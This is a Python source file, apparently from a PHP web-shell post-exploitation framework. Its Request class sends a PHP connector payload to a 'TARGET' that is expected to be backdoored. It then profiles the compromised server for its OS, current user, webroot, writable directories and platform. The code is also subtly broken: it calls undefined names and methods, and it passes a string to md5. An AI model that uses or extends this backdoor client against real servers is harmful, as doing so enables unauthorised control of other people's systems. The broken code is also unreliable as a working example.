import core
import tunnel
import session
from datatypes import Path


class Request:

    def __init__(self):
        pass

    def open(self):
        payload = Path(core.basedir, 'data/tunnel/connector.php').phpcode()

        socket = tunnel.handler.Request()
        socket.is_first_payload = True
        socket.errmsg_request = "Could not connect to TARGET"
        socket.errmsg_response = "TARGET does not seem to be backdoored"
        socket.open(payload)
        self.socket = socket
        raw_vars = self._get_vars(socket.read())
        session.Env = _build_env(raw_vars)

    def close(self):
        """close the virtual link, actually, juste return the
        link closed's string

        """
        print('[*] Connection to %s closed.' % self.host)
        return True

    def _get_vars(self, raw_response):
        """Retrieve and format connector's variables"""

        result = list()
        for name, value in raw_response.items():
            value = str(value).strip()
            result.append((name, value))
        return dict(result)


    def _build_env(self, raw_vars):
        """collect the server related vars, usefull for further
        plugins usage and framework management.
        written at self.CNF['SRV'] on the interface's core.

        """
        def choose(options, default=''):
            for choice in options:
                if choice in env:
                    if env[choice].strip():
                        return(env[choice])
            return(default)

        srv = dict()

        srv['client_addr'] = choose(['REMOTE_ADDR', 'REMOTE_HOST'])

        srv['host'] = choose(['SERVER_NAME', 'HTTP_HOST'],
                          self.CNF['LNK']['DOMAIN'])

        srv['addr'] = choose(['SERVER_ADDR', 'LOCAL_ADDR'], srv['host'])

        srv['port'] = choose(['SERVER_PORT'], '80')

        srv['os'] = choose(['OS', 'PHP_OS'], 'unknow')

        srv['user'] =(choose(['WHOAMI', 'USERNAME', 'USER']) or
                      choose(['USERPROFILE'], 'unknow').split('\\')[-1])

        srv['soft'] = choose(['SERVER_SOFTWARE'], 'unknow software')

        srv['phpver'] = choose(['PHP_VERSION'], '?')

        srv['webroot'] = choose(['WEBROOT'])

        srv['home'] = choose(['HOME'], srv['webroot'])

        srv['write_webdir'] = choose(['W_WEBDIR'])

        srv['write_tmpdir'] = choose(['W_TMPDIR'])

        # enclose ipv6 addresses with brackets for visibility
        if ":" in srv['client_addr']:
            srv['client_addr'] = "[%s]" %srv['client_addr']
        if ":" in srv['addr']:
            srv['addr'] = "[%s]" %srv['addr']

        # attempt to determine home dir if not known
        if not srv['home']:
            path = choose(['SCRIPT_FILENAME', 'PATH_TRANSLATED'])
            sep = '\\'
            if not path:
                path = '/'
            else:
                if path[0] == '/': sep = '/'
                path = sep.join(path.split(sep)[0:-1])
            srv['home'] = path

        # determine remote system's path separator
        srv['separator'] = '\\'
        if srv['home'].startswith('/'):
            srv['separator'] = '/'

        # get remote system's os platform
        srv['platform'] = 'nix'
        if srv['separator'] == '\\':
            srv['platform'] = 'win'

        # determine the remote server signature
        from hashlib import md5
        sig = srv['os']+srv['phpver']+srv['platform']+srv['soft']
        srv['signature'] = md5(sig).hexdigest()

        return(srv)
